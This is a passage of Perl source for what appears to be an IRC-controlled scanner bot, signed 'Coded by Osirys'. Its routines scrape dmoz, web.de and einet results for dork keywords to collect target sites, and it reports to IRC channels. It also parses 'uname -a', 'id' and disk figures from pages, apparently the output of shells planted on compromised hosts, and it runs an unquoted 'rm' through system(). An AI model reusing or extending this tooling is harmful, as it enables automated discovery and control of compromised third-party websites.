        my $dmozlink = ("http://search.dmoz.org/cgi-bin/search?search=".key($key)."&utf8=1&locale=it_it&start=".$p);
        my $re = query($dmozlink);
        if ($re =~ /\">Next<\/a>/) {
            while($re =~ m/<a href=\"http:\/\/(.+?)\"/g) {
                my $tsite = $1;
                if ($tsite !~ /dmoz/){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsite\n";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
    }
    return @lst;
}

sub webde () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    for $p(1..50){
        my $webdelink = ("http://suche.web.de/search/web/?pageIndex=".$p."&su=".key($key)."&y=0&x=0&mc=suche@web@navigation@zahlen.suche@web");
        my $re = query($webdelink);
        while($re =~ m/href=\"http:\/\/(.+?)\">/g) {
            my $tsite = $1;
            if ($tsite !~ /\/search\/web|web.de|\" class=\"neww\"/){
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsite\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub einet () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $einetest = ("http://www.einet.net/view/search.gst?p=1&k=".key($key)."&s=0&submit=Search");
    my $einet3st = query($einetest);
    if ($einet3st =~ /<span class=nPage>Page 1 of\s+(.+?)<\/span>/){
        my $totz = $1;
        for ($p=1;$p<=$totz;$p++){
            my $einetlink = ("http://www.einet.net/view/search.gst?p=".$p."&k=".key($key)."&s=0&submit=Search");
            my $re = query($einetlink);
            while($re =~ m/<span class=url2>\s+(.+?)<\/span>/g) {
                my $tsite = $1;
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsite\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}


sub remove() {
    my $file = $_[0];
    system("rm $file");
}

sub clean () {
    $dork = $_[0];
    if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
        writ1("15,1[+] 4,1Cleaning Dork from Google Search Keys !");
        $dork =~ s/^inurl://g;
        $dork =~ s/^allinurl://g;
        $dork =~ s/^intext://g;
        $dork =~ s/^allintext://g;
        $dork =~ s/^intitle://g;
        $dork =~ s/^allintitle://g;
    }
    return $dork;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->timeout(3);
    my $response = $ua->request($req);
    return $response->content;
}

sub query1() {
    my $url = $_[0];
    my $host  = $url;
    my $query = $url;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    eval {
        my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
        print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        my @r = <$sock>;
        $page = "@r";
        close($sock);
    };
    return $page;
}

sub os() {
    my $site = $_[0];
    my $ret  = &query($site);
    while ( $ret =~ m/<br>uname -a:(.+?)\<br>/g ) {
        $un = $1;
    }
    while ( $ret =~ m/<br>os:(.+?)\<br>/g ) {
        $os = $1;
    }
    while ( $ret =~ m/<br>id:(.+?)\<br>/g ) {
        $id1 = $1;
    }
    while ( $ret =~ m/<br>free:(.+?)\<br>/g ) {
        $free = $1;
    }
    while ( $ret =~ m/<br>used:(.+?)\<br>/g ) {
        $used = $1;
    }
    while ( $ret =~ m/<br>total:(.+?)\<br>/g ) {
        $all = $1;
    }
}

sub unici {
    my @unici = ();
    my %visti = ();
    foreach my $elemento (@_) {
        $elemento =~ s/\/+/\//g;
        next if $visti{$elemento}++;
        push @unici, $elemento;
    }
    return @unici;
}
      

sub writ1 () {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan1 :$cont\n";
}

sub writ2 () {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan2 :$cont\n";
}

sub priv8 () {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan2 :$cont\n";
}


## PRIVATE
## Coded by Osirys



